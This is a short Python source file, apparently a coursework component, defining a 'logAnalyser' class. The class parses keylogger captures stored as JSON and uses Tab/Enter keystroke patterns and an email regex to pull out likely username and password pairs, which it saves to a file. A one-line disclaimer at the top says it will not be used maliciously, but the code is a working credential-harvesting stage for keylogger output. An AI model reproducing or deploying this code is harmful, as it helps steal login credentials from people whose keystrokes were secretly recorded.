"""We will not use the program for any malicious activity"""
import json
import re

class logAnalyser:

    # read json file
    def read_json(self,jsonPath):
        json_file = open(jsonPath, 'r', encoding='utf-8')
        data = json.load(json_file)
        return data

        # find out possible (username, password)
    def analyze_json(self, datas):
        chose_data = []
        user_pass_format = ['username', 'password']

        # use regular expression to match email account
        # email_pattern = re.compile(r'.*@([a-zA-Z0-9_-]+)(\.[a-zA-Z]{2,})+$')
        # email_pattern = re.compile(r'[a-zA-Z0-9_-]+@([a-zA-Z0-9_-]+)(\.[a-zA-Z]{2,})+')
        email_pattern = re.compile(r'[a-zA-Z0-9_-]+@[a-zA-Z0-9\-\_\.]+')
        tab_pattern = re.compile(r'.*Key.tab')
        enter_pattern = re.compile(r'.*Key.enter')
        for i in range(0, len(datas)):
            if re.findall(tab_pattern, datas[i - 1]) and re.findall(enter_pattern, datas[i]):
                # Key. TAB or key. enter are redundant suffixes at the end of strings
                # that are specifically used for filtering
                tab_removed = datas[i-1].replace('Key.tab', '')
                enter_removed = datas[i].replace('Key.enter', '')
                # Separate out the space, according to the space to separate,
                # easy to remove the front window information
                possbile_user = tab_removed.split(" ")[-1]
                possbile_pass = enter_removed.split(" ")[-1]
                # Save it in the dictionary
                username_password = [possbile_user, possbile_pass]
                d1 = zip(user_pass_format, username_password)
                chose_data.append(dict(d1))

            elif datas[i - 2] == 'Key.tab' and datas[i] == 'Key.enter':
                # Separate out Spaces and divide according to Spaces
                possbile_user = datas[i-3].split(" ")[-1]
                possbile_pass = datas[i-1].split(" ")[-1]
                # Save it in the dictionary
                username_password = [possbile_user, possbile_pass]
                d1 = zip(user_pass_format, username_password)
                chose_data.append(dict(d1))

            elif re.findall(email_pattern, datas[i-1]):
                enter_removed = datas[i-1].replace('Key.enter', '')
                tab_removed = datas[i].replace('Key.tab', '')
                # Separate out Spaces and divide according to Spaces
                possbile_user = enter_removed.split(" ")[-1]
                possbile_pass = tab_removed.split(" ")[-1]
                # Save it in the dictionary
                if not re.findall(tab_pattern, datas[i]):
                    username_password = [possbile_user, possbile_pass]
                    d1 = zip(user_pass_format, username_password)
                    chose_data.append(dict(d1))

        return chose_data

# The test sample
# json file save path
# json_path = 'D:\\python\\cw\\keylog.json'
# json_path2 = 'D:\\python\\cw\\keylog.json\\jsonTest.json'
# save_path = 'D:\\python\\cw\\picked_data.json'

# analyzed_json = 'jsonanalyzer.json'
# analyzer = logAnalyser()
# datas = analyzer.read_json(json_path)
# print(datas)
# print("The chosen data set is: " + str(analyzer.analyze_json(datas)))
# picked_data = analyzer.analyze_json(datas)
# file_obj = open(save_path, 'w')
# json.dump(picked_data, file_obj)